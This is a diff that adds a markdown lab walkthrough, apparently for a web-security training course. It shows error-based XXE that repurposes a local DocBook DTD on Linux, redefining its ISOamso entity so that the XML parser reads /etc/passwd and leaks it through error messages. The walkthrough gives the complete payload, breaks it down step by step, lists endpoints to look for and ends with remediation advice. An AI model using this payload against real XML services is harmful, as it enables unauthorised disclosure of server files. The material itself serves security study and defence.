@@ -2572,3 +2572,440 @@ prefer JSON instead of XML
 ## 🧠 One-Line Summary
 
 👉 “External DTD XXE tricks XML parser into fetching attacker logic, reading server files, and leaking them through error messages.”
+
+---
+
+# 🧠 XXE via Repurposing Local DTD (Error-Based File Disclosure)
+
+---
+
+## 🔵 Overview
+
+This lab demonstrates:
+
+Blind XXE
+
+Error-based XXE
+
+Local DTD repurposing
+
+Entity redefinition
+
+Core idea:
+
+```txt
+Instead of hosting a malicious DTD externally:
+        ↓
+attacker abuses a trusted DTD already installed on the server
+        ↓
+redefines an existing entity
+        ↓
+injects malicious XXE logic
+        ↓
+leaks /etc/passwd through XML parser errors
+```
+
+---
+
+## 🟡 What is the Topic? (Theory + Concepts)
+
+---
+
+### 🔹 1. What is a Local DTD?
+
+DTD = Document Type Definition
+
+Some systems already contain DTD files for:
+
+documentation
+
+XML validation
+
+desktop applications
+
+Example:
+
+```txt
+/usr/share/yelp/dtd/docbookx.dtd
+```
+
+This is a legitimate DTD file on Linux systems using GNOME/Yelp.
+
+---
+
+### 🔹 2. Why Local DTD Matters
+
+Previously:
+
+attacker hosted DTD externally
+
+Now:
+
+attacker uses server’s own trusted DTD
+
+This helps bypass:
+
+blocked outbound requests
+
+external DTD filtering
+
+network restrictions
+
+---
+
+### 🔹 3. What is Entity Redefinition?
+
+A DTD may already contain entities like:
+
+```txt
+ISOamso
+```
+
+Attacker:
+
+redefines existing entity with malicious content
+
+This is:
+
+entity hijacking
+
+DTD repurposing
+
+---
+
+### 🔹 4. Parameter Entities
+
+Written as:
+
+```txt
+%name;
+```
+
+Used inside DTDs.
+
+They allow:
+
+dynamic XML logic
+
+nested entity execution
+
+---
+
+### 🔹 5. Key Mental Model
+
+```txt
+Attacker hijacks trusted DTD already present on server
+and turns it into malicious XXE logic.
+```
+
+---
+
+## 🟢 Lab Walkthrough (Step-by-Step)
+
+---
+
+### 🌐 Step 1 — Open Product Page
+
+Visit any product.
+
+Click:
+
+```txt
+Check stock
+```
+
+---
+
+### 📥 Step 2 — Intercept XML Request
+
+Captured request:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
+
+---
+
+### 💉 Step 3 — Inject Malicious DOCTYPE
+
+Insert payload between:
+
+XML declaration
+
+```txt
+<stockCheck>
+```
+
+---
+
+### 💣 Step 4 — Final Payload
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE message [
+
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+
+<!ENTITY % ISOamso '
+
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+
+&#x25;eval;
+
+&#x25;error;
+
+'>
+
+%local_dtd;
+
+]>
+
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
+
+![Modified XML Payload Using Local DTD](../images/local-dtd-error-based-xxe-payload.png)
+
+---
+
+## 🔍 Payload Breakdown
+
+---
+
+### 📌 1. Load Local DTD
+
+```xml
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+```
+
+Meaning
+
+Loads trusted DTD from server filesystem.
+
+---
+
+### 📌 2. Redefine Existing Entity
+
+```xml
+<!ENTITY % ISOamso ' ... '>
+```
+
+Meaning
+
+Overwrite existing entity:
+
+```txt
+ISOamso
+```
+
+with malicious logic.
+
+---
+
+### 📌 3. Read Sensitive File
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+```
+
+Meaning
+
+```txt
+%file = contents of /etc/passwd
+```
+
+---
+
+### 📌 4. Build Error Payload
+
+```xml
+<!ENTITY % eval "<!ENTITY &#x26;#x25; error SYSTEM 'file:///nonexistent/&#x25;file;&#x27;>">
+```
+
+Meaning
+
+Create invalid file path containing:
+
+```txt
+/etc/passwd content
+```
+
+---
+
+### 📌 5. Execute eval
+
+```xml
+&#x25;eval;
+```
+
+Meaning
+
+Run dynamic entity definition.
+
+---
+
+### 📌 6. Trigger Error
+
+```xml
+&#x25;error;
+```
+
+Meaning
+
+Parser attempts invalid file access.
+
+Result:
+
+💥 Error message leaks /etc/passwd
+
+---
+
+### 📌 7. Execute Trusted DTD
+
+```xml
+%local_dtd;
+```
+
+Meaning
+
+Loads local DTD.
+
+During parsing:
+
+👉 malicious ISOamso executes.
+
+---
+
+## 🔥 Full Attack Flow
+
+```txt
+1. XML request sent
+2. Trusted local DTD loaded
+3. Existing entity redefined
+4. /etc/passwd read
+5. Invalid file path generated
+6. XML parser throws error
+7. Error leaks file content
+```
+
+---
+
+## 🌍 Real-World Scenarios
+
+This attack can appear in:
+
+---
+
+### 🏦 Enterprise SOAP Systems
+
+Java XML parsers
+
+legacy banking apps
+
+---
+
+### ☁️ Hardened Servers
+
+outbound requests blocked
+
+local DTDs still accessible
+
+---
+
+### 🧾 Linux Enterprise Systems
+
+GNOME/Yelp packages installed
+
+XML validation services
+
+---
+
+### 📦 Internal XML Processors
+
+ERP systems
+
+invoice engines
+
+import/export tools
+
+---
+
+## 🔥 High Value Endpoints
+
+Look for:
+
+```txt
+/stockCheck
+/soap
+/api/xml
+/import
+/validate
+/feed
+/process
+```
+
+Especially:
+
+```txt
+XML parsers with restricted outbound access
+```
+
+---
+
+## ⚠️ Why This Attack Works
+
+Because:
+
+XML parser trusts local DTDs
+
+existing entities can be redefined
+
+parameter entities allow nested logic
+
+errors expose sensitive data
+
+---
+
+## 🛡️ Remediation
+
+disable DTD processing
+
+disable parameter entities
+
+prevent entity redefinition
+
+restrict filesystem access
+
+use secure XML parsers
+
+suppress parser error details
+
+---
+
+## 🧠 Important Terms
+
+```txt
+Term                  Meaning
+
+Local DTD             DTD already existing on server
+Yelp DTD              GNOME documentation DTD
+ISOamso               Existing entity inside DTD
+Entity Redefinition   Overwriting trusted entity
+Parameter Entity      %name; syntax
+Error-Based XXE       Leaking data via parser errors
+```
+
+---
+
+## 🟢 One-Line Summary
+
+👉 “This lab abuses a trusted local DTD file, redefines one of its entities, and leaks /etc/passwd through XML parser errors.”
